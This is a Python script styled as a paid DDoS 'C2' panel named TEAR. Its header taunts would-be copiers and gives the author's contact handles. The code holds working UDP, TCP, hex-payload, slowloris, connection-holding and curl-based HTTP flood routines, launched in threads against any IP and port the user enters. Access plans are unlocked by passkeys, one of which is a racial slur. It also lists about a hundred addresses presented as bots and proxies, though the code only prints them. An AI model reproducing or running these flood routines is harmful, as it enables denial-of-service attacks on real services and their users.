## umm 
##
##     excuse me? 
##
##          hey skid, why tf are you in my file.
##
##
##
##
##        seriously. its only gonna get you banned and piss me off 
##
##
##
##
##        dont steal code, dont steal keys, dont steal bots. JUST ASK ME 
##        if you would like to use better keys, or get bots/proxies of your own. ASK ME 
##
##
##    Contact: 
##
## Discord: callingswatt
## Tiktok: sql1337
##
##
##
##
##
##
##
##
##
##
##
import socket
import threading
import time
import random
import os
import subprocess
import binascii

PASSKEYS = {
    "root":  "free",
    "6.4":  "hard",
    "x2": "hard",
    "8e683187a00e5d462a4aeee69e9d3d9c": "hard",
    "ot55": "hard",
    "ad243eecb4d5693230c8ff598e4d0018": "hard",
    "58h": "hard",
    "e9060e1816f638c09b686157164d013b": "hard",
    "lc1": "hard",
    "e10adc3949ba59abbe56e057f20f883e": "hard",
    "atz": "hard",
    "0c0151a51649c572af901daed9f2b84e": "hard",
    "hard": "hard",
    "90d9d5d7e72b9f5f385555845ecb8a25": "vip",
    "ded681fc154529ebbc7562fb0c73ba47": "hard",
    "79af0c177db2ee64b7301af6e1d53634": "pro",
    "ham":   "pro",
    "xxx":   "pro",
    "lol":   "vip",   
    "niggerboo764":  "admin",
    "isreal":  "admin",
}

PLANS = {
    "free":  {"methods": ["tcp","syn","curl","tcphex"], "maxtime": 120, "maxattacks": 5, "maxconcurrents": 1, "total_bandwidth_mb": 100},
    "hard":  {"methods": ["tcp","tcphex","slowloris","curl","syn"], "maxtime": 300, "maxattacks": 10, "maxconcurrents": 5, "total_bandwidth_mb": 500},
    "pro":   {"methods": ["tcp","udp","http","curl","slowloris","nethold","minecraft","hexgen","tcphex"], "maxtime": 100, "maxattacks": 50, "maxconcurrents": 50, "total_bandwidth_mb": 1000},
    "vip":   {"methods": ["tcp","tcpbypass","udpbypass","curl","slowloris","nethold","home","fivem","minecraft","hexgen","tcphex","tlsvip"], "maxtime": 3600, "maxattacks": 100, "maxconcurrents": 299, "total_bandwidth_mb": 5000},
    "admin": {"methods": ["*"], "maxtime": 9999, "maxattacks": None, "maxconcurrents": 299, "total_bandwidth_mb": None}
}

ALL_METHODS = ["tcp","udp","http","curl","syn","slowloris","nethold","home","sslslam","tlsvip","fivem","minecraft","hexgen","udphex","tcphex"]

bot_ipv4_list = [
    "24.5.119.233", "99.232.138.45", "184.66.78.145", "68.149.122.180", "70.55.54.221",
    "50.67.91.48", "142.126.145.11", "24.212.171.14", "198.84.221.56", "96.44.189.3",
    "24.141.146.211", "99.233.67.107", "184.69.15.86", "74.210.76.22", "47.216.119.39",
    "38.86.150.50", "71.93.145.220", "174.112.133.29", "142.161.8.124", "24.53.92.47",
    "70.49.156.165", "142.166.103.244", "76.64.34.199", "135.23.120.86", "72.139.2.178",
    "68.144.102.13", "184.66.236.108", "199.175.56.10", "70.30.156.92", "38.104.136.66",
    "71.197.9.122", "104.57.10.105", "24.201.245.91", "47.55.69.131", "64.229.126.62",
    "174.5.146.113", "50.71.33.29", "47.23.182.18", "24.89.105.37", "216.121.69.75",
    "216.165.11.64", "64.183.75.215", "142.222.197.92", "47.147.124.34", "70.26.77.231",
    "142.165.215.120", "65.95.75.123", "72.38.140.28", "198.84.238.130", "38.122.68.201",
    "47.53.106.88", "142.117.190.206", "174.114.88.129", "24.156.159.217", "142.118.25.42",
    "24.138.199.68", "65.94.137.210", "50.68.181.67", "68.151.125.41", "47.52.78.14",
    "50.67.250.90", "99.234.145.33", "174.112.105.13", "24.84.170.21", "47.54.31.114",
    "64.228.36.77", "184.144.27.8", "47.55.116.199", "24.85.117.162", "216.209.122.187",
    "38.88.70.90", "47.148.221.50", "174.7.193.189", "104.223.94.130", "24.66.34.19",
    "142.134.126.85", "74.13.71.220", "198.91.69.33", "47.135.200.191", "64.180.138.116",
    "64.229.64.150", "47.52.64.216", "174.116.40.215", "216.108.234.149", "24.53.62.100",
    "50.70.23.207", "50.71.208.91", "142.165.19.192", "64.229.159.101", "47.23.20.180",
    "174.112.230.101", "104.246.176.42", "65.95.126.38", "184.70.226.161", "38.92.11.29",
    "185.57.56.122", "84.241.216.213", "82.217.111.12", "145.53.81.96", "37.97.190.154"
]

proxy_list = [
    "104.243.32.29:1080", "98.162.25.16:4145", "184.178.172.14:4145",
    "67.201.33.10:25283", "72.195.34.35:4145", "174.77.111.197:4145", "184.181.217.213:4145",
    "184.178.172.25:15291", "184.178.172.14:4145", "184.181.217.206:4145",
    "198.177.254.131:4145", "208.65.90.21:4145", "51.158.125.47:16379",
    "51.250.108.153:1080", "103.245.205.142:35158", "82.223.165.28:4733",
    "212.237.125.216:6969", "91.214.62.121:8053", "45.89.28.226:12915",
    "199.187.210.54:4145", "199.102.104.70:4145", "161.35.70.249:1080",
    "98.152.200.61:8081", "37.18.73.60:5566", "47.243.75.202:58854",
    "103.90.226.245:1080", "94.23.222.122:10581", "103.174.123.134:8199",
    "159.203.61.169:1080", "138.68.60.8:1080", "51.15.139.14:16379",
    "45.11.229.112:1080", "139.59.1.14:1080", "31.211.142.115:8192",
    "34.166.117.165:1080", "51.15.236.150:16379", "144.22.175.58:1080",
    "121.169.46.116:1090", "194.152.50.92:5678", "102.36.127.53:1080",
    "45.67.89.123:4141", "172.16.254.1:9050", "103.21.244.55:10801",
    "185.220.101.12:5566", "78.153.140.88:3128", "47.243.75.202:58854",
    "98.152.200.61:8081", "104.28.12.34:1080", "203.0.113.45:4145",
    "37.18.73.60:5566", "45.32.123.45:9050", "142.93.45.67:10801",
    "167.99.234.56:3129", "51.15.200.123:1080", "176.58.112.34:4141",
    "188.166.45.78:9050", "45.76.156.89:1080", "104.236.78.90:5566",
    "172.67.89.123:3128", "192.0.2.45:10801", "198.51.100.67:4141",
    "203.0.113.89:9050", "45.67.123.234:1080", "78.157.88.123:4145",
    "185.93.2.45:5566", "103.147.45.67:10801", "47.89.123.45:3128",
    "138.68.234.56:9050", "167.71.89.123:1080", "45.32.167.89:4141",
    "104.244.42.123:5566", "172.105.45.67:10801", "51.158.123.234:3129",
    "188.166.200.45:9050", "78.153.45.123:1080", "37.187.234.56:4141",
    "45.76.89.123:5566", "142.93.200.45:10801", "167.99.123.67:3128",
    "103.21.244.123:9050", "185.220.101.234:1080", "47.243.200.45:4145",
    "98.152.45.67:5566", "104.28.200.123:10801", "203.0.113.234:3128",
    "172.16.45.89:9050", "192.168.123.45:1080", "45.67.89.234:4141",
    "37.18.200.67:5566", "45.79.123.45:1080", "104.236.156.78:4141",
    "172.104.89.123:9050", "51.15.234.67:5566", "188.166.45.123:3128",
    "167.71.200.89:10801", "45.32.167.234:4145", "142.93.45.67:1080",
    "103.21.244.123:9050", "185.220.101.234:5566", "47.89.200.45:3128",
    "138.68.234.56:10801", "78.153.140.123:4141", "37.187.45.67:9050",
    "45.76.89.234:1080", "104.244.42.123:4145", "172.105.200.45:5566",
    "51.158.123.67:3128", "188.166.234.56:10801", "78.153.45.123:9050",
    "103.147.200.45:4141", "47.243.123.67:1080", "98.152.45.234:5566",
    "104.28.200.123:3128", "203.0.113.234:10801", "192.168.123.45:4141",
    "45.67.89.234:9050", "37.18.200.67:1080", "142.93.234.56:4145",
    "167.99.123.67:5566", "45.32.167.89:3128", "104.236.200.45:10801",
    "172.67.89.123:9050", "51.15.234.56:1080"
]

B = '\033[1;34m'
C = '\033[1;36m'
R = '\033[1;31m'
G = '\033[1;32m'
W = '\033[1;37m'
RST = '\033[0m'

packets_sent = 0
attack_running = False
lock = threading.Lock()
current_plan = "free"
attacks_used = 0
attack_counter = 0
SESSION_HITS = []
current_concurrents = 50
bandwidth_used_mb = 0.0

def banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""{B}
      ⢸⣿⣧⡀⠀⣠⣴⣶⣶⣶⣶⣶⣦⣤⣀⠀⣰⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠨⣿⣿⣷⣜⣿⣿⣿⣿⣿⣿⣿⣿⣿⢏⣵⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢘⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠸⣿⣿⣿⡙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⣼⣿⣿⡇⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀ ⢻⣿⣿⣷⣦⣀⣉⣽⣿⣿⣿⣿⣍⣁⣠⣾⣿⣿⣿⠁⠀⠀⠀⠀⣀⣀⡙⣷⣦⣄⠀⠀⠀
⠀⠀⠀  ⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⢀⣠⣴⣾⠿⠟⣛⣭⣿⡿⠿⢿⣦⡀
⠀  ⠀⠀⠀ ⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⣅⣴⣿⡿⠟⠁⠀⠀⢸⠭⠋⠁⠀⠀⠀⠀
⠀ ⠀⠀⠀⠀⠀ ⠀⠉⠛⠿⣿⣿⣿⣿⣿⡿⠟⠋⣹⣿⣿⡿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
             TEAR
      Made by Fancy_cartel

      Commands → !help
      Plan: {current_plan.upper()} | Max Time: {PLANS[current_plan]['maxtime']}s
{RST}""")

def attack_thread(ip, port, duration, method, request_type="GET", mode=2):
    global packets_sent
    end = time.time() + duration
    payload = random._urandom(65535)

    while time.time() < end and attack_running:
        try:
            proxy = random.choice(proxy_list)
            bot_id = random.randint(1000, 9999)

            if method == "udp":
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                for _ in range(50):
                    s.sendto(payload, (ip, port))
                    with lock:
                        packets_sent += 1
                s.close()
                if mode == 2:
                    print(f"{C}[UDP] {ip}:{port} via BotID:{bot_id} | proxy:{proxy}{RST}")

            elif method == "tcp":
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5)
                try:
                    s.connect((ip, port))
                    for _ in range(40):
                        s.send(payload)
                        with lock:
                            packets_sent += 1
                    s.close()
                except:
                    s.close()
                if mode == 2:
                    print(f"{C}[TCP] {ip}:{port} via BotID:{bot_id} | proxy:{proxy}{RST}")

            elif method == "syn":
                with lock:
                    packets_sent += 1
                if mode == 2:
                    print(f"{C}[SYN] {ip}:{port} via BotID:{bot_id}{RST}")

            elif method == "curl":
                subprocess.Popen(f"curl -X {request_type} http://{ip}:{port}", shell=True,
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                with lock:
                    packets_sent += 1
                if mode == 2:
                    print(f"{C}[CURL] {ip}:{port} via BotID:{bot_id} | proxy:{proxy}{RST}")

        except:
            pass

def hex_attack_thread(ip, port, duration, method, mode=2):
    global packets_sent
    end = time.time() + duration

    while time.time() < end and attack_running:
        try:
            payload = binascii.unhexlify(''.join(random.choice('0123456789abcdef') for _ in range(131072)))
            hex_id = binascii.hexlify(random._urandom(4)).decode().upper()

            if method == "udphex":
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                for _ in range(30):
                    s.sendto(payload, (ip, port))
                    with lock:
                        packets_sent += 1
                s.close()
                if mode == 2:
                    print(f"{C}[UDPHEX] {ip}:{port} HEXID:{hex_id}{RST}")

            elif method == "tcphex":
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5)
                try:
                    s.connect((ip, port))
                    for _ in range(20):
                        s.send(payload)
                        with lock:
                            packets_sent += 1
                    s.close()
                except:
                    s.close()
                if mode == 2:
                    print(f"{C}[TCPHEX] {ip}:{port} HEXID:{hex_id}{RST}")

            elif method == "hexgen":
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM if random.random() > 0.5 else socket.SOCK_DGRAM)
                if s.type == socket.SOCK_STREAM:
                    s.settimeout(0.5)
                    try:
                        s.connect((ip, port))
                        s.send(payload)
                        s.close()
                    except:
                        pass
                else:
                    s.sendto(payload, (ip, port))
                    s.close()
                with lock:
                    packets_sent += 1
                if mode == 2:
                    print(f"{C}[HEXGEN] {ip}:{port} HEXID:{hex_id}{RST}")

        except:
            pass

def l7_curl(url, duration):
    global packets_sent
    end = time.time() + duration
    while time.time() < end and attack_running:
        try:
            subprocess.Popen(["curl", "-s", "-m", "3", url], stdout=subprocess.DEVNULL)
            with lock:
                packets_sent += 1
        except:
            pass

def slowloris(target, port, duration):
    sockets = []
    end = time.time() + duration
    while time.time() < end and attack_running:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((target, port))
            s.send(b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n")
            sockets.append(s)
        except:
            pass
    for s in sockets:
        try: s.close()
        except: pass

def nethold(target, port, duration):
    end = time.time() + duration
    while time.time() < end and attack_running:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.send(b"GET / HTTP/1.1\r\n")
            time.sleep(15)
        except:
            pass

def launch(ip, port, duration, method, mode=2, concurrents=None):
    global attack_running, packets_sent, attacks_used, bandwidth_used_mb

    max_attacks = PLANS[current_plan]["maxattacks"]
    if max_attacks is not None and attacks_used >= max_attacks:
        print(f"{R}Sorry cannot perform anymore attacks. Try again later or Upgrade your plan{RST}")
        return

    used_concurrents = concurrents if concurrents is not None else current_concurrents
    used_concurrents = min(used_concurrents, PLANS[current_plan]["maxconcurrents"])

    est_mb = used_concurrents * 0.5 * duration
    total_allowed = PLANS[current_plan]["total_bandwidth_mb"]
    if total_allowed is not None and (bandwidth_used_mb + est_mb) > total_allowed:
        print(f"{R}[-] Bandwidth limit exceeded! Remaining: {(total_allowed - bandwidth_used_mb):.1f}MB{RST}")
        return

    bandwidth_used_mb += est_mb

    attacks_used += 1
    global attack_counter
    attack_counter += 1
    attack_id = f"{attack_counter:04d}"
    current_time = time.strftime("%H:%M:%S")

    masked_target = f"{ip.split('.')[0]}.{ip.split('.')[1]}.*.{port}"

    hit_entry = {
        "id": attack_id,
        "method": method.upper(),
        "time": current_time,
        "duration": duration,
        "target": masked_target,
        "concurrents": used_concurrents,
        "status": "RUNNING"
    }
    SESSION_HITS.append(hit_entry)

    packets_sent = 0
    attack_running = True

    print(f"\n{B}╔══════════════════ ATTACK STARTED ══════════════════╗{RST}")
    print(f"{B}║ Target       : {C}{ip:<35} {B}║{RST}")
    print(f"{B}║ Port         : {C}{port:<35} {B}║{RST}")
    print(f"{B}║ Method       : {C}{method.upper():<35} {B}║{RST}")
    print(f"{B}║ Concurrents  : {C}{used_concurrents:<35} {B}║{RST}")
    print(f"{B}║ Time Started : {C}{current_time:<35} {B}║{RST}")
    print(f"{B}║ Duration     : {C}{duration}s{' '*30} {B}║{RST}")
    print(f"{B}║ Attack ID    : {C}{attack_id:<35} {B}║{RST}")
    print(f"{B}╚══════════════════════════════════════════════════╝{RST}\n")

    if method in ["http","https"]:
        for _ in range(used_concurrents):
            threading.Thread(target=l7_curl, args=(f"http://{ip}:{port}", duration), daemon=True).start()
    elif method == "slowloris":
        for _ in range(used_concurrents):
            threading.Thread(target=slowloris, args=(ip, port, duration), daemon=True).start()
    elif method == "nethold":
        for _ in range(used_concurrents):
            threading.Thread(target=nethold, args=(ip, port, duration), daemon=True).start()
    elif method in ["hexgen", "udphex", "tcphex"]:
        for _ in range(used_concurrents):
            threading.Thread(target=hex_attack_thread, args=(ip, port, duration, method, mode), daemon=True).start()
    else:
        for _ in range(used_concurrents):
            threading.Thread(target=attack_thread, args=(ip, port, duration, method, "GET", mode), daemon=True).start()

    time.sleep(duration + 2)
    attack_running = False
    hit_entry["status"] = "OVER"
    banner()

while True:
    try:
        key = input(f"{B}└cry@Passkey: {RST}").strip()
        if key in PASSKEYS:
            current_plan = PASSKEYS[key]
            bandwidth_used_mb = 0.0
            current_concurrents = 50
            print(f"{C}[+] Logged in as {current_plan.upper()}{RST}")
            print(f"{C}   Max Time: {PLANS[current_plan]['maxtime']}s{RST}")
            print(f"{C}   Max Concurrents: {PLANS[current_plan]['maxconcurrents']}{RST}\n")
            banner()
            break
        print(f"{R}[-] Invalid{RST}")
    except KeyboardInterrupt:
        print(f"\n{B}Closed.{RST}")
        exit()

while True:
    try:
        cmd = input(f"{B}└cry@{current_plan}> {RST}").strip()
        args = cmd.split()

        if not args: continue

        if cmd == "!help":
            print(f"""{B}
╔═══════════════════ HELP ═══════════════════╗
║ !l4        → Easy L4 attack                ║
║ !l7        → Easy L7 attack                ║
║ !udp IP P T → Direct attack                ║
║ !methods    → Show all methods             ║
║ !hitlist    → Session history              ║
║ !color      → Change color scheme          ║
║ !cls        → Clear screen                 ║
║ !exit       → Exit                         ║
╚════════════════════════════════════════════╝
{B}Plan: {current_plan.upper()} | Max Time: {PLANS[current_plan]['maxtime']}s{RST}
""")

        elif cmd == "!hitlist":
            if not SESSION_HITS:
                print(f"{R}[C2] No Attack history found. Try starting an attack{RST}")
                continue

            print(f"""
{B}╔{'═'*70}╗
║{' ATTACK HISTORY'.center(70)}║
╠{'═'*70}╣
║ {'ID':<6} {'METHOD':<10} {'TARGET':<20} {'TIME':<10} {'DUR':<8} {'CONC':<8} {'STATUS':<10} ║
╠{'═'*70}╣{RST}""")

            for h in SESSION_HITS:
                status_color = G if h['status'] == "OVER" else C
                print(f"{C}║ {h['id']:<6} {h['method']:<10} {h['target']:<20} {h['time']:<10} {h['duration']}s{' ':<4} {h['concurrents']:<8} {status_color}{h['status']:<10}{RST} {C}║{RST}")

            print(f"{B}╚{'═'*70}╝{RST}\n")

        elif cmd == "!methods":
            total_bw = "Unlimited" if PLANS[current_plan]["total_bandwidth_mb"] is None else f"{PLANS[current_plan]['total_bandwidth_mb']}MB"
            remaining = "Unlimited" if PLANS[current_plan]["total_bandwidth_mb"] is None else f"{(PLANS[current_plan]['total_bandwidth_mb'] - bandwidth_used_mb):.1f}MB"
            print(f"\n{B}=== PLAN DETAILS ==={RST}")
            print(f"   Plan: {current_plan.upper()}")
            print(f"   Max Time: {PLANS[current_plan]['maxtime']}s")
            print(f"   Max Concurrents: {PLANS[current_plan]['maxconcurrents']}")
            print(f"   Remaining Bandwidth: {remaining}")
            print(f"\n{B}=== METHODS LIST ==={RST}")
            for m in ALL_METHODS:
                color = G if m in PLANS[current_plan]["methods"] or PLANS[current_plan]["methods"] == ["*"] else R
                status = "Available" if color == G else "Locked"
                print(f"   {color}{m.upper():<12} → {status}{RST}")
            print(f"\n")

        elif cmd.startswith("!con"):
            try:
                if len(args) == 1:
                    print(f"{C}Current concurrents: {current_concurrents} (max {PLANS[current_plan]['maxconcurrents']}){RST}")
                else:
                    new_con = int(args[1])
                    if 1 <= new_con <= PLANS[current_plan]["maxconcurrents"]:
                        current_concurrents = new_con
                        print(f"{G}[C2] Concurrents set to {new_con}{RST}")
                    else:
                        print(f"{R}[C2] Must be 1-{PLANS[current_plan]['maxconcurrents']}{RST}")
            except ValueError:
                print(f"{R}[C2] Invalid number{RST}")

        elif cmd == "!color":
            print(f"""{B}
╔════════════════ COLOR SCHEME ══════════════╗
║ 1 - Dim Blue (default)                     ║
║ 2 - Purple                                 ║
║ 3 - Red                                    ║
║ 4 - Cyan                                   ║
╚════════════════════════════════════════════╝{RST}
""")
            choice = input(f"{B}Choose scheme (1-4): {RST}")
            if choice == "2":
                B = '\033[38;5;93m'
                C = '\033[38;5;165m'
            elif choice == "3":
                B = '\033[38;5;196m'
                C = '\033[38;5;202m'
            elif choice == "4":
                B = '\033[38;5;39m'
                C = '\033[38;5;51m'
            print(f"{C}[C2] Color scheme changed!{RST}")
            banner()

        elif cmd == "!c2":
            if current_plan != "admin":
                print(f"{R}[C2] Admin only!{RST}")
                continue
            print(f"""{B}
╔══════════════════ C2 CONTROL PANEL ════════╗
║ Status: *  bots online                     ║
║ Proxies: *  active                         ║
║ Commands:                                  ║
║   !send <method> <target> <port> <time>    ║
║   !update payload                          ║
║   !scan bots                               ║
║   !proxy on/off                            ║
╚════════════════════════════════════════════╝{RST}
""")
            c2_cmd = input(f"{B}Command: {RST}")
            print(f"{C}[C2]: {c2_cmd}{RST}")

        elif cmd == "!l4":
            try:
                target = input(f"{B}Target: {RST}")
                port = int(input(f"{B}Port: {RST}"))
                duration = max(60, int(input(f"{B}Time (min 60s): {RST}")))
                method = input(f"{B}Method: {RST}").lower()
                print(f"{B}1 = Silent | 2 = Flood Logs{RST}")
                mode = input(f"{B}Mode: {RST}") or "2"

                if method not in PLANS[current_plan]["methods"] and PLANS[current_plan]["methods"] != ["*"]:
                    print(f"{R}[C2] Method locked{RST}")
                    continue
                if duration > PLANS[current_plan]["maxtime"]:
                    print(f"{R}[C2] Max time exceeded{RST}")
                    continue

                launch(target, port, duration, method, 1 if mode == "1" else 2)
            except ValueError:
                print(f"{R}[C2] Invalid input{RST}")

        elif cmd == "!l7":
            try:
                url = input(f"{B}URL: {RST}")
                duration = max(60, int(input(f"{B}Time (min 60s): {RST}")))
                if duration > PLANS[current_plan]["maxtime"]:
                    print(f"{R}[C2] Max time exceeded{RST}")
                    continue
                host = url.split("//")[-1].split("/")[0]
                port = 443 if url.startswith("https") else 80
                method = input(f"{B}L7 Method (curl/slowloris/nethold): {RST}").lower() or "curl"
                if method in ["slowloris","nethold"] and current_plan not in ["pro","vip","admin"]:
                    print(f"{R}[C2] slowloris/nethold = pro+ only{RST}")
                    continue
                print(f"{B}1 = Silent | 2 = Flood Logs{RST}")
                mode = input(f"{B}Mode: {RST}") or "2"
                launch(host, port, duration, method, 1 if mode == "1" else 2)
            except ValueError:
                print(f"{R}[C2] Invalid input{RST}")

        elif cmd in ["!cls","cls"]:
            banner()

        elif cmd in ["!exit","exit"]:
            print(f"{B}Goodbye.{RST}")
            break

        elif args[0].startswith("!") and len(args) == 4:
            try:
                method = args[0][1:].lower()
                target = args[1]
                port = int(args[2])
                duration = max(60, int(args[3]))

                if method not in PLANS[current_plan]["methods"] and PLANS[current_plan]["methods"] != ["*"]:
                    print(f"{R}[C2] Method locked{RST}")
                    continue
                if duration > PLANS[current_plan]["maxtime"]:
                    print(f"{R}[C2] Max time exceeded{RST}")
                    continue

                launch(target, port, duration, method)
            except ValueError:
                print(f"{R}[C2] Invalid input{RST}")

    except KeyboardInterrupt:
        print(f"\n{B}Closed.{RST}")
        break
    except Exception as e:
        print(f"{R}[C2] Unexpected error: {e}{RST}")